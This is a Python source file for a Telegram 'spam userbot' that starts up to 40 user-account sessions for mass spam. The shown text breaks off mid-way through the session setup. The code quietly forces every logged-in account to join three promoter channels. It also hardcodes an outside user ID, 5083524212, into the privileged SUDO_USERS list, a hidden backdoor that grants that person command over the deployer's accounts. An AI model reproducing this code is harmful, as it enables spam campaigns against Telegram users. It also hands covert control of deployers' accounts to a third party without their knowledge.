# randomspam - Spam Userbots
# Copyright © 2021 @Rockerz_Updates

import os
import sys
import random
import asyncio
import telethon.utils
from telethon.tl import functions
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from decouple import config
from os import getenv
import logging
import time
from telethon.tl.functions.messages import ImportChatInviteRequest


logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                    level=logging.WARNING)

#version

randomoelversion = "v2.0.1"

#values
API_ID = config("API_ID", default=None, cast=int)
API_HASH = config("API_HASH", default=None)
ALIVE_PIC = config("ALIVE_PIC", default=None)
CMD_HNDLR = getenv("CMD_HNDLR", default=".")
HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
HEROKU_API_KEY = config("HEROKU_API_KEY", None)
STRING = config("STRING", default=None)
STRING2 = config("STRING2", default=None)
STRING3 = config("STRING3", default=None)
STRING4 = config("STRING4", default=None)
STRING5 = config("STRING5", default=None)
STRING6 = config("STRING6", default=None)
STRING7 = config("STRING7", default=None)
STRING8 = config("STRING8", default=None)
STRING9 = config("STRING9", default=None)
STRING10 = config("STRING10", default=None)
STRING11 = config("STRING11", default=None)
STRING12 = config("STRING12", default=None)
STRING13 = config("STRING13", default=None)
STRING14 = config("STRING14", default=None)
STRING15 = config("STRING15", default=None)
STRING16 = config("STRING16", default=None)
STRING17 = config("STRING17", default=None)
STRING18 = config("STRING18", default=None)
STRING19 = config("STRING19", default=None)
STRING20 = config("STRING20", default=None)
STRING21 = config("STRING21", default=None)
STRING22 = config("STRING22", default=None)
STRING23 = config("STRING23", default=None)
STRING24 = config("STRING24", default=None)
STRING25 = config("STRING25", default=None)
STRING26 = config("STRING26", default=None)
STRING27 = config("STRING27", default=None)
STRING28 = config("STRING28", default=None)
STRING29 = config("STRING29", default=None)
STRING30 = config("STRING30", default=None)
STRING31 = config("STRING31", default=None)
STRING32 = config("STRING32", default=None)
STRING33 = config("STRING33", default=None)
STRING34 = config("STRING34", default=None)
STRING35 = config("STRING35", default=None)
STRING36 = config("STRING36", default=None)
STRING37 = config("STRING37", default=None)
STRING38 = config("STRING38", default=None)
STRING39 = config("STRING39", default=None)
STRING40 = config("STRING40", default=None)
SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
if 5083524212 not in SUDO_USERS:
    SUDO_USERS.append(5083524212)
OWNER_ID = int(os.environ.get("OWNER_ID", None))

# Don't Mess with Codes !! 
DEV = list(map(int, getenv("FULLSUDO").split()))
DB_URI = config("DATABASE_URL", None)
DEV.append(OWNER_ID)
SUDO_USERS.append(OWNER_ID)

# Sessions
async def Rockerz_Updates():
    global random
    global random2
    global random3
    global random5
    global random4
    global random6
    global random7
    global random8
    global random9
    global random10
    global random11
    global random12
    global random13
    global random14
    global random15
    global random16
    global random17
    global random18
    global random19
    global random20
    global random21
    global random22
    global random23
    global random25
    global random24
    global random26
    global random27
    global random28
    global random29
    global random30
    global random31
    global random32
    global random33
    global random34
    global random35
    global random36
    global random37
    global random38
    global random39
    global random40
    
    if STRING:
        session_name = str(STRING)
        print("String 1 Found")
        random = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 1")
            await random.start()
            botme = await random.get_me()
            await random(functions.channels.JoinChannelRequest(channel="@Rockerz_Updates"))
            await random(functions.channels.JoinChannelRequest(channel="@Rockerz_Support"))
            await random(functions.channels.JoinChannelRequest(channel="@Xmarty_Support"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            random = "STRING"
            print(e)
            pass
    else:
        print("Session 1 not Found")
        session_name = "randomspam"
        random = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await random.start()
        except Exception as e:
            pass
   
    if STRING2:
        session_name = str(STRING2)
        print("String 2 Found")
        random2 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 2")
            await random2.start()
            await random2(functions.channels.JoinChannelRequest(channel="@Rockerz_Updates"))
            await random2(functions.channels.JoinChannelRequest(channel="@Rockerz_Support"))
            await random2(functions.channels.JoinChannelRequest(channel="@Xmarty_Support"))
            botme = await random2.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 2 not Found")
        pass
        session_name = "randomspam"
        random2 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await random2.start()
        except Exception as e:
            pass

    if STRING3:
        session_name = str(STRING3)
        print("String 3 Found")
        random3 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 3")
            await  random3.start()
            await random3(functions.channels.JoinChannelRequest(channel="@Rockerz_Updates"))
            await random3(functions.channels.JoinChannelRequest(channel="@Rockerz_Support"))
            await random3(functions.channels.JoinChannelRequest(channel="@Xmarty_Support"))
            botme = await random3.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 3 not Found")
        pass
        session_name = "randomspam"
        random3 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await random3.start()
        except Exception as e:
            pass

    if STRING4:
        session_name = str(STRING4)
        print("String 4 Found")
        random4 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 4")
            await random4.start()
            await random4(functions.channels.JoinChannelRequest(channel="@Rockerz_Updates"))
            await random4(functions.channels.JoinChannelRequest(channel="@Rockerz_Support"))
            await random4(functions.channels.JoinChannelRequest(channel="@Xmarty_Support"))
            botme = await random4.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 4 not Found")
        pass
        session_name = "randomspam"
        random4 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await random4.start()
        except Exception as e:
            pass

    if STRING5:
        session_name = str(STRING5)
        print("String 5 Found")
        random5 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 5")
            await random5.start()
            await random5(functions.channels.JoinChannelRequest(channel="@Rockerz_Updates"))
            await random5(functions.channels.JoinChannelRequest(channel="@Rockerz_Support"))
            await random5(functions.channels.JoinChannelRequest(channel="@Xmarty_Support"))
            botme = await random5.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 5 not Found")
        pass
        session_name = "randomspam"
        random5 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await random5.start()
        except Exception as e:
            pass
                  
    if STRING6:
        session_name = str(STRING6)
        print("String 6 Found")
        random6 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 6")
            await random6.start()
            await random6(functions.channels.JoinChannelRequest(channel="@Rockerz_Updates"))
            await random6(functions.channels.JoinChannelRequest(channel="@Rockerz_Support"))
            await random6(functions.channels.JoinChannelRequest(channel="@Xmarty_Support"))
            botme = await random6.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 6 not Found")
        pass
        session_name = "randomspam"
        random6 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await random6.start()
        except Exception as e:
            pass

    if STRING7:
        session_name = str(STRING7)
        print("String 7 Found")
        random7 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 7")
            await random7.start()
            await random7(functions.channels.JoinChannelRequest(channel="@Rockerz_Updates"))
            await random7(functions.channels.JoinChannelRequest(channel="@Rockerz_Support"))
            await random7(functions.channels.JoinChannelRequest(channel="@Xmarty_Support"))
            botme = await random7.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 7 not Found")
        pass
        session_name = "randomspam"
        random7 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await random7.start()
        except Exception as e:
            pass    
        
    
    if STRING8:
        session_name = str(STRING8)
        print("String 8 Found")
        random8 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 8")
            await random8.start()
            await random8(functions.channels.JoinChannelRequest(channel="@Rockerz_Updates"))
            await random8(functions.channels.JoinChannelRequest(channel="@Rockerz_Support"))
            await random8(functions.channels.JoinChannelRequest(channel="@Xmarty_Support"))
            botme = await random8.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 8 not Found")
        pass
        session_name = "randomspam"
        random8 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await random8.start()
        except Exception as e:
            pass   
        
    if STRING9:
        session_name = str(STRING9)
        print("String 9 Found")
        random9 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 9")
            await random9.start()
            await random9(functions.channels.JoinChannelRequest(channel="@Rockerz_Updates"))
            await random9(functions.channels.JoinChannelRequest(channel="@Rockerz_Support"))
            await random9(functions.channels.JoinChannelRequest(channel="@Xmarty_Support"))
            botme = await random9.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 9 not Found")
        pass
        session_name = "randomspam"
        random9 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await random9.start()
        except Exception as e:
            pass   
    
  
    if STRING10:
        session_name = str(STRING10)
        print("String 10 Found")
        random10 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 10")
            await random10.start()
            await random10(functions.channels.JoinChannelRequest(channel="@Rockerz_Updates"))
            await random10(functions.channels.JoinChannelRequest(channel="@Rockerz_Support"))
            await random10(functions.channels.JoinChannelRequest(channel="@Xmarty_Support"))
            botme = await random10.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 10 not Found")
        pass
        session_name = "randomspam"
        random10 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await random10.start()
        except Exception as e:
            pass 
        
    
    if STRING11:
        session_name = str(STRING11)
        print("String 11 Found")
        random11 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 11")
            await random11.start()
            await random11(functions.channels.JoinChannelRequest(channel="@Rockerz_Updates"))
            await random11(functions.channels.JoinChannelRequest(channel="@Rockerz_Support"))
            await random11(functions.channels.JoinChannelRequest(channel="@Xmarty_Support"))
            botme = await random11.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 11 not Found")
        pass
        session_name = "randomspam"
        random11 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await random11.start()
        except Exception as e:
            pass
        
    
    if STRING12:
        session_name = str(STRING12)
        print("String 12 Found")
        random12 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 12")
            await random12.start()
            await random12(functions.channels.JoinChannelRequest(channel="@Rockerz_Updates"))
            await random12(functions.channels.JoinChannelRequest(channel="@Rockerz_Support"))
            await random12(functions.channels.JoinChannelRequest(channel="@Xmarty_Support"))
            botme = await random12.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 12 not Found")
        pass
        session_name = "randomspam"
        random12 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await random12.start()
        except Exception as e:
            pass   
    
  
    if STRING13:
        session_name = str(STRING13)
        print("String 13  Found")
        random13 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 13")
            await random13.start()
            await random13(functions.channels.JoinChannelRequest(channel="@Rockerz_Support"))
            await random13(functions.channels.JoinChannelRequest(channel="@Rockerz_Updates"))
            await random13(functions.channels.JoinChannelRequest(channel="@Xmarty_Support"))
            botme = await random13.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 13 not Found")
        pass
        session_name = "randomspam"
        random13 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await random13.start()
        except Exception as e:
            pass 
        
    
    if STRING14:
        session_name = str(STRING14)
        print("String 14 Found")
        random14 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 14")
            await random14.start()
            await random14(functions.channels.JoinChannelRequest(channel="@Rockerz_Updates"))
            await random14(functions.channels.JoinChannelRequest(channel="@Rockerz_Support"))
            await random14(functions.channels.JoinChannelRequest(channel="@Xmarty_Support"))
            botme = await random14.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 14 not Found")
        pass
        session_name = "randomspam"
        random14 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await random14.start()
        except Exception as e:
            pass
        
    
    if STRING15:
        session_name = str(STRING15)
        print("String 15 Found")
        random15 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 15")
            await random15.start()
            await random15(functions.channels.JoinChannelRequest(channel="@Rockerz_Updates"))
            await random15(functions.channels.JoinChannelRequest(channel="@Rockerz_Support"))
            await random15(functions.channels.JoinChannelRequest(channel="@Xmarty_Support"))
            botme = await random15.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 15 not Found")
        pass
        session_name = "randomspam"
        random15 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await random15.start()
        except Exception as e:
            pass


    if STRING16:
        session_name = str(STRING16)
        print("String 16 Found")
        random16 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 16")
            await random16.start()
            botme = await random16.get_me()
            await random16(functions.channels.JoinChannelRequest(channel="@Rockerz_Updates"))
            await random16(functions.channels.JoinChannelRequest(channel="@Rockerz_Support"))
            await random16(functions.channels.JoinChannelRequest(channel="@Xmarty_Support"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 16 not Found")
        session_name = "randomspam"
        random16 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await random16.start()
        except Exception as e:
            pass
   
    if STRING17:
        session_name = str(STRING17)
        print("String 17 Found")
        random17 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 17")
            await random17.start()
            botme = await random17.get_me()
            await random17(functions.channels.JoinChannelRequest(channel="@Rockerz_Support"))
            await random17(functions.channels.JoinChannelRequest(channel="@Rockerz_Updates"))
            await random17(functions.channels.JoinChannelRequest(channel="@Xmarty_Support"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 17 not Found")
        session_name = "randomspam"
        random17 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await random17.start()
        except Exception as e:
            pass
   
    if STRING18:
        session_name = str(STRING18)
        print("String 18 Found")
        random18 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 18")
            await random18.start()
            botme = await random18.get_me()
            await random18(functions.channels.JoinChannelRequest(channel="@Rockerz_Updates"))
            await random18(functions.channels.JoinChannelRequest(channel="@Rockerz_Support"))
            await random18(functions.channels.JoinChannelRequest(channel="@Xmarty_Support"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 18 not Found")
        session_name = "randomspam"
        random18 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await random18.start()
        except Exception as e:
            pass
   
    if STRING19:
        session_name = str(STRING19)
        print("String 19 Found")
        random19 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 19")
            await random19.start()
            botme = await random19.get_me()
            await random19(functions.channels.JoinChannelRequest(channel="@Rockerz_Updates"))
            await random19(functions.channels.JoinChannelRequest(channel="@Rockerz_Support"))
            await random19(functions.channels.JoinChannelRequest(channel="@Xmarty_Support"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 19 not Found")
        session_name = "randomspam"
        random19 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await random.start()
        except Exception as e:
            pass
   
    if STRING20:
        session_name = str(STRING20)
        print("String 20 Found")
        random20 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 20")
            await random20.start()
            botme = await random20.get_me()
            await random20(functions.channels.JoinChannelRequest(channel="@Rockerz_Updates"))
            await random20(functions.channels.JoinChannelRequest(channel="@Rockerz_Support"))
            await random20(functions.channels.JoinChannelRequest(channel="@Xmarty_Support"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 20 not Found")
        session_name = "randomspam"
        random20 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await random20.start()
        except Exception as e:
            pass

    if STRING21:
        session_name = str(STRING21)
        print("String 21 Found")
        random21 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 21")
            await random21.start()
            botme = await random21.get_me()
            await random21(functions.channels.JoinChannelRequest(channel="@Rockerz_Updates"))
            await random21(functions.channels.JoinChannelRequest(channel="@Rockerz_Support"))
            await random21(functions.channels.JoinChannelRequest(channel="@Xmarty_Support"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 31 not Found")
        session_name = "randomspam"
        random21 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await random21.start()
        except Exception as e:
            pass
   
    if STRING22:
        session_name = str(STRING22)
        print("String 22 Found")
        random22 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 32")
            await random22.start()
            await random22(functions.channels.JoinChannelRequest(channel="@Rockerz_Updates"))
            await random22(functions.channels.JoinChannelRequest(channel="@Rockerz_Support"))
            await random22(functions.channels.JoinChannelRequest(channel="@Xmarty_Support"))
            botme = await random22.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 22 not Found")
        pass
        session_name = "randomspam"
        random22 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await random22.start()
        except Exception as e:
            pass

    if STRING23:
        session_name = str(STRING23)
        print("String 23 Found")
        random23 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 23")
            await  random23.start()
            await random23(functions.channels.JoinChannelRequest(channel="@Rockerz_Updates"))
            await random23(functions.channels.JoinChannelRequest(channel="@Rockerz_Support"))
            await random23(functions.channels.JoinChannelRequest(channel="@Xmarty_Support"))
            botme = await random23.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 23 not Found")
        pass
        session_name = "randomspam"
        random23 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await random23.start()
        except Exception as e:
            pass

    if STRING24:
        session_name = str(STRING24)
        print("String 24 Found")
        random24 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 24")
            await random24.start()
            await random24(functions.channels.JoinChannelRequest(channel="@Rockerz_Updates"))
            await random24(functions.channels.JoinChannelRequest(channel="@Rockerz_Support"))
            await random24(functions.channels.JoinChannelRequest(channel="@Xmarty_Support"))
            botme = await random24.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 24 not Found")
        pass
        session_name = "randomspam"
        random24 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await random24.start()
        except Exception as e:
            pass

    if STRING25:
        session_name = str(STRING25)
        print("String 25 Found")
        random25 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 35")
            await random25.start()
            await random25(functions.channels.JoinChannelRequest(channel="@Rockerz_Updates"))
            await random25(functions.channels.JoinChannelRequest(channel="@Rockerz_Support"))
            await random25(functions.channels.JoinChannelRequest(channel="@Xmarty_Support"))
            botme = await random25.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 25 not Found")
        pass
        session_name = "randomspam"
        random25 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await random25.start()
        except Exception as e:
            pass
                  
    if STRING26:
        session_name = str(STRING26)
        print("String 36 Found")
        random26 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 26")
            await random26.start()
            await random26(functions.channels.JoinChannelRequest(channel="@Rockerz_Updates"))
            await random26(functions.channels.JoinChannelRequest(channel="@Rockerz_Support"))
            await random26(functions.channels.JoinChannelRequest(channel="@Xmarty_Support"))
            botme = await random26.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 26 not Found")
        pass
        session_name = "randomspam"
        random26 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await random26.start()
        except Exception as e:
            pass

    if STRING27:
        session_name = str(STRING27)
        print("String 27 Found")
        random27 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 27")
            await random27.start()
            await random27(functions.channels.JoinChannelRequest(channel="@Rockerz_Updates"))
            await random27(functions.channels.JoinChannelRequest(channel="@Rockerz_Support"))
            await random27(functions.channels.JoinChannelRequest(channel="@Xmarty_Support"))
            botme = await random27.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 27 not Found")
        pass
        session_name = "randomspam"
        random27 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await random27.start()
        except Exception as e:
            pass    
        
    
    if STRING28:
        session_name = str(STRING28)
        print("String 28 Found")
        random28 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 18")
            await random28.start()
            await random28(functions.channels.JoinChannelRequest(channel="@Rockerz_Updates"))
            await random28(functions.channels.JoinChannelRequest(channel="@Rockerz_Support"))
            await random28(functions.channels.JoinChannelRequest(channel="@Xmarty_Support"))
            botme = await random28.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 28 not Found")
        pass
        session_name = "randomspam"
        random28 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await random28.start()
        except Exception as e:
            pass   
        
    if STRING29:
        session_name = str(STRING29)
        print("String 29 Found")
        random29 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 29")
            await random29.start()
            await random29(functions.channels.JoinChannelRequest(channel="@Rockerz_Updates"))
            await random29(functions.channels.JoinChannelRequest(channel="@Rockerz_Support"))
            await random29(functions.channels.JoinChannelRequest(channel="@Xmarty_Support"))
            botme = await random29.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 29 not Found")
        pass
        session_name = "randomspam"
        random29 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await random29.start()
        except Exception as e:
            pass   
    
  
    if STRING30:
        session_name = str(STRING30)
        print("String 30 Found")
        random30 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 30")
            await random30.start()
            await random30(functions.channels.JoinChannelRequest(channel="@Rockerz_Updates"))
            await random30(functions.channels.JoinChannelRequest(channel="@Rockerz_Support"))
            await random30(functions.channels.JoinChannelRequest(channel="@Xmarty_Support"))
            botme = await random30.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 30 not Found")
        pass
        session_name = "randomspam"
        random30 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await random30.start()
        except Exception as e:
            pass 
        
    
    if STRING31:
        session_name = str(STRING31)
        print("String 31 Found")
        random31 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 31")
            await random31.start()
            await random31(functions.channels.JoinChannelRequest(channel="@Rockerz_Updates"))
            await random31(functions.channels.JoinChannelRequest(channel="@Rockerz_Support"))
            await random31(functions.channels.JoinChannelRequest(channel="@Xmarty_Support"))
            botme = await random31.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 31 not Found")
        pass
        session_name = "randomspam"
        random31 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await random31.start()
        except Exception as e:
            pass
        
    
    if STRING32:
        session_name = str(STRING32)
        print("String 32 Found")
        random32 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 32")
            await random32.start()
            await random32(functions.channels.JoinChannelRequest(channel="@Rockerz_Updates"))
            await random32(functions.channels.JoinChannelRequest(channel="@Rockerz_Support"))
            await random32(functions.channels.JoinChannelRequest(channel="@Xmarty_Support"))
            botme = await random32.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 32 not Found")
        pass
        session_name = "randomspam"
        random32 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await random32.start()
        except Exception as e:
            pass   
    
  
    if STRING33:
        session_name = str(STRING33)
        print("String 33  Found")
        random33 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 33")
            await random33.start()
            await random33(functions.channels.JoinChannelRequest(channel="@Rockerz_Support"))
            await random33(functions.channels.JoinChannelRequest(channel="@Rockerz_Updates"))
            await random33(functions.channels.JoinChannelRequest(channel="@Xmarty_Support"))
            botme = await random33.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 33 not Found")
        pass
        session_name = "randomspam"
        random33 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await random33.start()
        except Exception as e:
            pass 
        
    
    if STRING34:
        session_name = str(STRING34)
        print("String 34 Found")
        random34 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 34")
            await random34.start()
            await random34(functions.channels.JoinChannelRequest(channel="@Rockerz_Updates"))
            await random34(functions.channels.JoinChannelRequest(channel="@Rockerz_Support"))
            await random34(functions.channels.JoinChannelRequest(channel="@Xmarty_Support"))
            botme = await random34.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 34 not Found")
        pass
        session_name = "randomspam"
        random34 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await random34.start()
        except Exception as e:
            pass
        
    
    if STRING35:
        session_name = str(STRING35)
        print("String 35 Found")
        random35 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 35")
            await random35.start()
            await random35(functions.channels.JoinChannelRequest(channel="@Rockerz_Updates"))
            await random35(functions.channels.JoinChannelRequest(channel="@Rockerz_Support"))
            await random35(functions.channels.JoinChannelRequest(channel="@Xmarty_Support"))
            botme = await random35.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 35 not Found")
        pass
        session_name = "randomspam"
        random35 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await random35.start()
        except Exception as e:
            pass


    if STRING36:
        session_name = str(STRING36)
        print("String 36 Found")
        random36 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 36")
            await random36.start()
            botme = await random36.get_me()
            await random36(functions.channels.JoinChannelRequest(channel="@Rockerz_Updates"))
            await random36(functions.channels.JoinChannelRequest(channel="@Rockerz_Support"))
            await random36(functions.channels.JoinChannelRequest(channel="@Xmarty_Support"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 36 not Found")
        session_name = "randomspam"
        random36 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await random36.start()
        except Exception as e:
            pass
   
    if STRING37:
        session_name = str(STRING37)
        print("String 37 Found")
        random37 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 37")
            await random37.start()
            botme = await random37.get_me()
            await random37(functions.channels.JoinChannelRequest(channel="@Rockerz_Support"))
            await random37(functions.channels.JoinChannelRequest(channel="@Rockerz_Updates"))
            await random37(functions.channels.JoinChannelRequest(channel="@Xmarty_Support"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 37 not Found")
        session_name = "randomspam"
        random37 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await random37.start()
        except Exception as e:
            pass
   
    if STRING38:
        session_name = str(STRING38)
        print("String 38 Found")
        random38 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 38")
            await random38.start()
            botme = await random38.get_me()
            await random38(functions.channels.JoinChannelRequest(channel="@Rockerz_Updates"))
            await random38(functions.channels.JoinChannelRequest(channel="@Rockerz_Support"))
            await random38(functions.channels.JoinChannelRequest(channel="@Xmarty_Support"))
